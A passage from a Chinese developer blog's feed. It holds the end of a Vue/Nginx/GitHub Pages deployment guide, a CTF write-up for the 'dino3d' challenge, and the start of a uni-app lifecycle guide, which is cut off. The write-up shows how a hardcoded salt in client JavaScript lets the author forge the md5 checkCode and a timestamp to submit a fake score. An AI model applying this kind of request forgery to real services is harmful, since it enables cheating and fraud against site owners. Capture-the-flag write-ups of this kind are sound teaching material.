{</span></span><span class="line"><span style="color: #D4D4D4">            proxy_pass http://localhost:1337;  # 代理到 Strapi</span></span><span class="line"><span style="color: #D4D4D4">            proxy_http_version 1.1;  # 使用 HTTP/1.1</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header Upgrade $http_upgrade;  # 处理 WebSocket</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header Connection 'upgrade';  # 处理 WebSocket</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header Host $host;  # 传递主机头</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header X-Real-IP $remote_addr;  # 传递客户端真实 IP</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # 传递转发 IP</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header X-Forwarded-Proto $scheme;  # 传递原始协议</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        location /upload {</span></span><span class="line"><span style="color: #D4D4D4">            proxy_pass http://localhost:1337;  # 代理到 Strapi</span></span><span class="line"><span style="color: #D4D4D4">            proxy_http_version 1.1;  # 使用 HTTP/1.1</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header Upgrade $http_upgrade;  # 处理 WebSocket</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header Connection 'upgrade';  # 处理 WebSocket</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header Host $host;  # 传递主机头</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header X-Real-IP $remote_addr;  # 传递客户端真实 IP</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # 传递转发 IP</span></span><span class="line"><span style="color: #D4D4D4">            proxy_set_header X-Forwarded-Proto $scheme;  # 传递原始协议</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        # 其他 location 配置...</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>我的 demo 使用的数据来自 <a href="https://strapi.nodejs.cn/dev-docs/quick-start">Strapi</a>（<a href="https://zhuanlan.zhihu.com/p/671975325">什么是 Strapi？</a>），我将该无头 CMS 部署到了和 Nginx 同一系统环境之下，于是有了上述配置。</p><h2 id="部署到-github-pages"><a class="markdownIt-Anchor" href="#部署到-github-pages"></a> 部署到 GitHub Pages</h2><h3 id="可选配置"><a class="markdownIt-Anchor" href="#可选配置"></a> 可选配置</h3><p>终于到了激动人心的部署时刻，在打包之前请根据上文做好自己项目的配置，除此之外还有一个配置对于 vite 打包的项目<strong>可选</strong>：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// vite.config.js</span></span><span class="line"><span style="color: #C8C8C8">build</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C8C8C8">rollupOptions</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C8C8C8">output</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">entryFileNames</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'js/[name]-[hash].js'</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 指定 JS 文件的输出路径及命名规则</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">chunkFileNames</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'js/[name]-[hash].js'</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 指定分片文件的输出路径及命名规则</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">assetFileNames</span><span style="color: #D4D4D4">: (</span><span style="color: #9CDCFE">assetInfo</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 设置不同类型文件的输出路径及命名规则</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">assetInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'asset'</span><span style="color: #D4D4D4"> &amp;&amp;</span><span style="color: #D16969"> /</span><span style="color: #D7BA7D">\.</span><span style="color: #CE9178">(</span><span style="color: #D16969">jpe</span><span style="color: #D7BA7D">?</span><span style="color: #D16969">g</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">png</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">gif</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">svg</span><span style="color: #CE9178">)</span><span style="color: #DCDCAA">$</span><span style="color: #D16969">/</span><span style="color: #569CD6">i</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">assetInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'img/[name].[hash].[ext]'</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 图像文件输出路径及命名规则</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">assetInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">'asset'</span><span style="color: #D4D4D4"> &amp;&amp;</span><span style="color: #D16969"> /</span><span style="color: #D7BA7D">\.</span><span style="color: #CE9178">(</span><span style="color: #D16969">ttf</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">woff</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">woff2</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">eot</span><span style="color: #CE9178">)</span><span style="color: #DCDCAA">$</span><span style="color: #D16969">/</span><span style="color: #569CD6">i</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">assetInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'fonts/[name].[hash].[ext]'</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 字体文件输出路径及命名规则</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'[ext]/name1-[hash].[ext]'</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 其他资源文件输出路径及命名规则</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>添加上述 <code>build</code> 配置项，将会将打包后的 dist 目录按类型分 <code>css</code>、<code>js</code>、<code>img</code> 文件夹。当然<strong>只是可选，非必须</strong>。</p><blockquote><p>配置项参考文章：<a href="https://blog.csdn.net/qq_33522195/article/details/137021366">vue 项目配置 vite 打包输出文件夹（css，img，js，font）</a></p></blockquote><h3 id="github-部署"><a class="markdownIt-Anchor" href="#github-部署"></a> Github 部署</h3><p>好了，请将项目 <code>build</code> 打包为一个 <code>dist</code> 文件夹。然后按照以下步骤进行部署：</p><ol><li><p>转到 <a href="https://github.com/">GitHub</a> 创建一个新的仓库（已有仓库跳第二步），填写 <code>Repository name</code> 仓库名并将仓库设为 <code>Public</code> 公开就可以了，其他不用设置，点击 <code>Create repository</code> 创建仓库即可。</p></li><li><p>复制仓库的 ssh 链接（<a href="https://www.cnblogs.com/lezaizhu/p/13836164.html">我没有用过 git 进行远程仓库绑定</a>），例如：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git@github.com:yourUserName/article-management-admin.git</span></span></code></pre></div></div></figure></li><li><p>找到本地刚新鲜打包的 <code>dist</code> 文件夹，进入文件夹中，目录结构应该为：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"># vue-cli 打包结果</span></span><span class="line"><span style="color: #D4D4D4">├─css</span></span><span class="line"><span style="color: #D4D4D4">├─img</span></span><span class="line"><span style="color: #D4D4D4">├─js</span></span><span class="line"><span style="color: #D4D4D4">├─.nojekyll</span></span><span class="line"><span style="color: #D4D4D4">├─favicon.ico</span></span><span class="line"><span style="color: #D4D4D4">└─index.html</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4"># vite 打包结果</span></span><span class="line"><span style="color: #D4D4D4">├─asset</span></span><span class="line"><span style="color: #D4D4D4">├─favicon.ico</span></span><span class="line"><span style="color: #D4D4D4">└─index.html</span></span></code></pre></div></div></figure></li><li><p>在 <code>dist</code><strong>文件夹内</strong>，执行 git 仓库初始化</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">init</span></span></code></pre></div></div></figure></li><li><p>添加所有文件到暂存区，并执行 <code>commit</code> 提交<br>注：<code>vite</code> 打包的项目可能会存在以<code>_</code>下划线开头的 <code>js</code> 文件，而 <code>GitHub Pages</code> 可能忽略该文件，导致项目 demo 无法找到文件报 404 错误，请检查你的 dist 文件夹下的 asset 目录中是否存在上述文件。如果确实存在，请在 <code>dist</code> 目录下创建一个空文件以禁用 GitHub Pages 的 Jekyll 默认处理行为，文件名为：<code>.nojekyll</code><br>参考文章：<a href="https://www.cnblogs.com/deajax/p/12430884.html">github pages 不能识别下划线开头的文件</a></p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">add</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">.</span></span><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">commit</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-m</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"-Write down your message here."</span></span></code></pre></div></div></figure></li><li><p>绑定远程仓库</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">remote</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">add</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">origin</span><span style="color: #D4D4D4"> &lt;</span><span style="color: #CE9178">remote-ur</span><span style="color: #D4D4D4">l&gt;</span></span></code></pre></div></div></figure></li><li><p>你可以将该分支（我的默认初始化分支为 main）先 push 推送出去，已有仓库的可以跳到 8</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">push</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-u</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">origin</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">main</span></span></code></pre></div></div></figure></li><li><p>创建孤立的空分支 <code>gh-pages</code> 用于推送</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">checkout</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--orphan</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">gh-pages</span></span></code></pre></div></div></figure></li><li><p>推送代码到 <code>gh-pages</code> 分支用于部署静态页面</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">git</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">push</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-u</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">origin</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">gh-pages</span></span></code></pre></div></div></figure></li><li><p>转到 GitHub 仓库页，请切换仓库分支为 <code>gh-pages</code> 并等待 <code>GitHub</code> 的 <code>check</code> 操作：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410110255530.png" alt="image-20241011025535410"></p></li><li><p>GitHub 的 check 操作完成后，点击仓库 <code>Settings</code> 设置项，然后在左侧侧边栏选择 <code>Pages</code>，点击构建好的链接或者右边的 <code>Visit site</code> 即可。<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410110259820.png" alt="image-20241011025932731"></p></li></ol><p>小白篇到此，完结撒花 🎉🎉🎉</p><p>有更多需求可以自行探索，相信你已经入门了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2022 九月挑战赛 dino3d</title>
      <link href="/posts/29897.html"/>
      <url>/posts/29897.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><blockquote><p>题目链接：<a href="https://buuoj.cn/match/matches/151/challenges">https://buuoj.cn/match/matches/151/challenges</a></p></blockquote><p>启动环境之后，玩一会，进行抓包：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104203141388-1667565104615-1.png" alt="1"></p><p>得到 score 分数和 checkcode，因为要玩到 1000000 分，所以直接修改分数 score 为目标分数发出看看：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104203423402-1667565266070-3.png" alt="2"></p><p>看来行不通，可能还要<strong>伪造 checkcode 和 tm 时间戳</strong>。</p><p>f12 查看 js 代码，ctrl+f 搜索 checkcode，找到定义：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104203851364-1667565535786-5.png" alt="3"></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">checkCode</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"DASxCBCTF"</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">salt</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>这里这个 salt 并不知道是什么，还需要查看代码分析。</p><p>知道定义之后，再查看另外两个搜索结果：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104204137072-1667565698310-7.png" alt="4"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104204157356-1667565718617-9.png" alt="5"></p><p>判断关键信息：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">body</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"score="</span><span style="color: #D4D4D4"> +</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">parseInt</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">() +</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"&amp;checkCode="</span><span style="color: #D4D4D4"> +</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">md5</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">parseInt</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">() + </span><span style="color: #9CDCFE">t</span><span style="color: #D4D4D4">) +</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">"&amp;tm="</span><span style="color: #D4D4D4"> +</span></span><span class="line"><span style="color: #D4D4D4">  (+</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Date</span><span style="color: #D4D4D4">()).</span><span style="color: #DCDCAA">toString</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">substring</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>根据抓包结果，我们知道数据格式是：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">score</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">xxx</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">checkCode</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">xxx</span><span style="color: #D4D4D4">&amp;</span><span style="color: #9CDCFE">tm</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">xxx</span></span></code></pre></div></div></figure><p>所以可以判定这里的 e 是分数，那么这个 md5 () 函数里面的 <strong>t</strong> 又是什么？</p><p>到这里就进展不下去了，只能再去找找这个 <strong>salt</strong>，因为根据定义（或者说赋值语句）中的 checkcode = "xxx"+salt 来看，这个 salt 可能就是 t</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104204811600-1667566092580-11.png" alt="image-20221104204811600-1667566092580-11"></p><p>搜索 salt 发现赋值语句：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">salt</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"_wElc03e"</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>此外并未搜索到其他新的跟 salt 有关的语句了。</p><p>那么我们就要验证一下这个 t 是不是就是 salt 了。验证的方法也很简单，直接 md5 (分数 + salt) 然后跟我们抓包的结果进行比对即可。</p><p>抓包结果：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">score=150</span></span><span class="line"><span style="color: #D4D4D4">checkCode=c652f21617f6592c3918c8aa7aa85502</span></span></code></pre></div></div></figure><p>md5 加密结果：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">150DASxCBCTF_wElc03e</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">md5_after:c652f21617f6592c3918c8aa7aa85502</span></span></code></pre></div></div></figure><p>拼接加密结果和抓包结果的 checkcode 相同。这样就能伪造 checkcode 了</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">checkcode=md5(score+DASxCBCTF+_wElc03e)</span></span></code></pre></div></div></figure><p>由于我们要达到目标分才能拿到 flag，那么先直接将目标 checkcode 写出</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">flag_checkcode: 4639d0ab43e9030749f450eb6e9fbb97</span></span></code></pre></div></div></figure><p>score</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">flag_score: 1000000</span></span></code></pre></div></div></figure><p>时间戳的话，直接通过在线网站查询然后写一个未来时间的值，等到了那个值同一时间将包发出即可。（考虑网络延迟，可能要稍微快一点点将包发出）</p><p>时间戳转换网址：<a href="https://shijianchuo.net/">https://shijianchuo.net/</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/image-20221104211441095-1667567683413-13.png" alt="13"></p><p>返回查看就能得到 flag 了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uni-app 涉及到的生命周期小结</title>
      <link href="/posts/7498.html"/>
      <url>/posts/7498.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="description" content="uni-app涉及到的生命周期小结">UniApp 中，除了常见的 Vue 生命周期（如 `created`、`mounted` 等），它还提供了特定于小程序和移动应用的**页面生命周期**和**应用生命周期**<h2 id="uniapp-常见的页面生命周期"><a class="markdownIt-Anchor" href="#uniapp-常见的页面生命周期"></a> UniApp 常见的页面生命周期</h2><h3 id="1-onloadoptions"><a class="markdownIt-Anchor" href="#1-onloadoptions"></a> 1、onLoad(options)</h3><ul><li>页面加载时触发。</li><li>常用于初始化页面数据，从页面 URL 的参数 <code>options</code> 获取数据。</li><li>只在页面首次加载时触发一次。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onLoad</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">options</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 可以从options中拿到url查询参数</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'页面加载'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">options</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="2-onshow"><a class="markdownIt-Anchor" href="#2-onshow"></a> 2、onShow()</h3><ul><li>页面显示时触发，可能在页面首次加载后，也可能在页面重新显示时（如从后台切回前台）。</li><li>常用于刷新页面数据或 UI 状态。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onShow</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'页面显示'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="3-onready"><a class="markdownIt-Anchor" href="#3-onready"></a> 3、onReady()</h3><ul><li>页面初次渲染完成时触发，只触发一次。</li><li>页面结构加载和绘制完成后触发，可以在此进行与 UI 相关的操作。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onReady</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'页面初次渲染完成'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="4-onhide"><a class="markdownIt-Anchor" href="#4-onhide"></a> 4、onHide()</h3><ul><li>页面被隐藏时触发，比如跳转到其他页面或应用切换到后台时。</li><li>常用于暂停页面中的定时器或动画。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onHide</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'页面隐藏'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="5-onunload"><a class="markdownIt-Anchor" href="#5-onunload"></a> 5、onUnload()</h3><ul><li>页面卸载（离开）时触发，常用于清理资源（如关闭网络请求或销毁定时器）。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onUnload</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'页面卸载'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="6-onpulldownrefresh"><a class="markdownIt-Anchor" href="#6-onpulldownrefresh"></a> 6、onPullDownRefresh()</h3><ul><li>监听用户下拉动作的事件处理函数。</li><li>需要在 <code>pages.json</code> 中启用页面的下拉刷新功能。</li></ul><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"path"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"goods_list/goods_list"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"style"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"enablePullDownRefresh"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><ul><li>在处理完数据刷新后，调用 <code>uni.stopPullDownRefresh()</code> 来结束下拉刷新状态。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 